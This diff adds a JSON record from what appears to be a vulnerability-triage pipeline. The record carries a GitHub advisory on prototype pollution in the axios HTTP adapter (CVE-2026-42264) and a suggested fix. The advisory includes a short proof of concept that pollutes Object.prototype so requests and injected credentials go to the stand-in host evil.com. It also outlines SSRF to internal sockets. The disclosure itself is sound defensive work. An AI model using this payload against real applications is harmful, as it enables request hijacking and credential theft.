@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/262970208?v=4\", \"events_url\": \"https://api.github.com/users/bulmax9797-sketch/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/bulmax9797-sketch/followers\", \"following_url\": \"https://api.github.com/users/bulmax9797-sketch/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/bulmax9797-sketch/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/bulmax9797-sketch\", \"id\": 262970208, \"login\": \"bulmax9797-sketch\", \"node_id\": \"U_kgDOD6ybYA\", \"organizations_url\": \"https://api.github.com/users/bulmax9797-sketch/orgs\", \"received_events_url\": \"https://api.github.com/users/bulmax9797-sketch/received_events\", \"repos_url\": \"https://api.github.com/users/bulmax9797-sketch/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/bulmax9797-sketch/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/bulmax9797-sketch/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/bulmax9797-sketch\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42264\", \"cvss\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.4, \"vector_string\": \"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-1321\", \"name\": \"Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')\"}], \"description\": \"## Summary\\n\\nFive config properties in the HTTP adapter are read via direct property access without `hasOwnProperty` guards, making them exploitable as prototype pollution gadgets. When `Object.prototype` is polluted by another dependency in the same process, axios silently picks up these polluted values on every outbound HTTP request.\\n\\n## Affected Properties\\n\\n1. **`config.auth`** (`lib/adapters/http.js` line 617)  Injects attacker-controlled `Authorization` header on all requests.\\n2. **`config.baseURL`** (`lib/helpers/resolveConfig.js` line 18) Redirects all requests using relative URLs to an attacker-controlled server.\\n3. **`config.socketPath`** (`lib/adapters/http.js` line 669) Redirects requests to internal Unix sockets (e.g. Docker daemon).\\n4. **`config.beforeRedirect`** (`lib/adapters/http.js` line 698) Executes attacker-supplied callback during HTTP redirects.\\n5. **`config.insecureHTTPParser`** (`lib/adapters/http.js` line 712) Enables Node.js insecure HTTP parser on all requests.\\n\\n## Proof of Concept\\n\\n```javascript\\nconst axios = require('axios');\\n\\n// Prototype pollution from a vulnerable dependency in the same process\\nObject.prototype.auth = { username: 'attacker', password: 'exfil' };\\nObject.prototype.baseURL = 'https://evil.com';\\n\\nawait axios.get('/api/users');\\n// Request is sent to: https://evil.com/api/users\\n// With header: Authorization: Basic YXR0YWNrZXI6ZXhmaWw=\\n// Attacker receives both the request and injected credentials\\n```\\n\\n## Impact\\n\\n- **Credential injection:** Every axios request includes an attacker-controlled `Authorization` header, leaking request contents to any server that logs auth headers.\\n- **Request hijacking:** All requests using relative URLs are silently redirected to an attacker-controlled server.\\n- **SSRF:** Requests can be redirected to internal Unix sockets, enabling container escape in Docker environments.\\n- **Code execution:** Attacker-supplied functions execute during HTTP redirects.\\n- **Parser weakening:** Insecure HTTP parser enabled on all requests, enabling request smuggling.\\n\\n## Root Cause\\n\\n`mergeConfig()` iterates `Object.keys({...config1, ...config2})`, which only returns own properties. When neither the defaults nor the user config sets these properties, they are absent from the merged config. The HTTP adapter then reads them via direct property access (`config.auth`, `config.socketPath`, etc.), which traverses the prototype chain and picks up polluted values.\\n\\nThe `own()` helper at `lib/adapters/http.js` line 336 exists and guards 8 other properties (`data`, `lookup`, `family`, `httpVersion`, `http2Options`, `responseType`, `responseEncoding`, `transport`) from this exact attack. The 5 properties listed above are not included in this protection.\\n\\n## Suggested Fix\\n\\nApply the existing `own()` helper to all affected properties:\\n\\n```javascript\\nconst configAuth = own('auth');\\nif (configAuth) {\\n  const username = configAuth.username || '';\\n  const password = configAuth.password || '';\\n  auth = username + ':' + password;\\n}\\n```\\n\\nSame pattern for `socketPath`, `beforeRedirect`, `insecureHTTPParser`, and a `hasOwnProperty` check for `baseURL` in `resolveConfig.js`.\", \"epss\": {\"percentage\": 0.00715, \"percentile\": 0.49539}, \"ghsa_id\": \"GHSA-q8qp-cvcw-x6jj\", \"github_reviewed_at\": \"2026-05-05T00:18:38Z\", \"html_url\": \"https://github.com/advisories/GHSA-q8qp-cvcw-x6jj\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-q8qp-cvcw-x6jj\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42264\"}], \"nvd_published_at\": \"2026-05-08T04:16:20Z\", \"published_at\": \"2026-05-05T00:18:38Z\", \"references\": [\"https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42264\", \"https://github.com/axios/axios/pull/10779\", \"https://github.com/axios/axios/commit/47915144662f2733e6c051bdcb895a8c8f0586aa\", \"https://github.com/axios/axios/releases/tag/v1.15.2\", \"https://github.com/advisories/GHSA-q8qp-cvcw-x6jj\"], \"repository_advisory_url\": \"https://api.github.com/repos/axios/axios/security-advisories/GHSA-q8qp-cvcw-x6jj\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/axios/axios\", \"summary\": \"Axios has prototype pollution read-side gadgets in HTTP adapter that allow credential injection and request hijacking\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-12T13:28:43Z\", \"url\": \"https://api.github.com/advisories/GHSA-q8qp-cvcw-x6jj\", \"vulnerabilities\": [{\"first_patched_version\": \"1.15.2\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"axios\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \">= 1.0.0, < 1.15.2\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-q8qp-cvcw-x6jj",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "axios: >= 1.0.0, < 1.15.2"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-42264"
+    ],
+    "cvss_score": 7.4,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "axios"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.961795Z",
+  "provenance": {
+    "content_sha256": "567a77526c64cd5e913607aceb8a448a0254487de287de060c019c63b3bb757d",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-05T00:18:38Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-q8qp-cvcw-x6jj",
+  "status": "active",
+  "title": "Axios has prototype pollution read-side gadgets in HTTP adapter that allow credential injection and request hijacking",
+  "updated_at": "2026-05-12T13:28:43Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-q8qp-cvcw-x6jj"
+}
